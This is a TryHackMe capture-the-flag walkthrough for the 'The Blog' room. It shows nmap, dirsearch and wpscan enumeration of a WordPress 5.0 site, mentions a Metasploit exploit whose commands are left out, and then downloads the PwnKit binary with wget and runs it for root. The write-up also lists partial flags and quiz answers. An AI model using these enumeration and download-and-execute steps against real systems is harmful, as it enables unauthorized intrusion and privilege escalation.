# TryHackMe Lab: The Blog

## Task 1: Starting the Machine

*Credit to Sq00ky for the root privesc idea!*

Answer the questions below:

*   `root.txt`
*   `user.txt`
*   Where was `user.txt` found?
*   What CMS was Billy using?
*   What version of the above CMS was being used?

---

### Initial Reconnaissance

First, we start by scanning open ports on the target machine:

```bash
root@ip:~# nmap IP_MACHINE
```

Looking at the open ports, we can then use dirsearch for a more thorough directory enumeration:

```bash
root@ip:~# dirsearch dir -u http://IP_MACHINE/ -w rocku
```

Next, we identify the CMS being used and its version:

```bash
root@ip:~# wpscan --url http://blog.thm/ --enumerate p
[+] WordPress version 5.0
```

Gaining User Access
Now that we have the WordPress version, we can enumerate users and attempt to retrieve their credentials using wpscan:

```bash
root@ip:~# wpscan --url http://blog.thm/ --enumerate u
```

Excellent! We have obtained a username and password. We can now try to log in and gather more information about the service.

Exploitation and Privilege Escalation
A hint suggests looking on Exploit-DB. We’ve found a vulnerability and will try to use Metasploit.

We’ll search for a specific exploit, possibly related to proc-image.

Using the obtained username and password, we configure the exploit with RHOST and LHOST.


# ... Metasploit exploit commands ...
We are now inside the system! To escalate privileges, we’ll use linpeas.sh.

```bash
cd /tmp
wget http://[IP_MACHINE/PwnKit
chmod +x ./PwnKit
./PwnKit
```

Let’s check our current user:

```bash
whoami
```

Great, we are now root!

Finding the Flags
Finally, we’ll search for the flags across all directories:

```bash
find / -name root.txt
cat /root/root.txt

find / -name user.txt
cat /home/bjoel/user.txt # You won't find what you're looking for here. TRY HARDER
cat /media/usb/user.txt
root.txt: 9a0b2b618... (partial flag)
user.txt: c842189... (partial flag)
```

Answers to the Questions<br>
Where was user.txt found? /media/usb<br>
What CMS was Billy using? WordPress<br>
What version of the above CMS was being used? 5.0
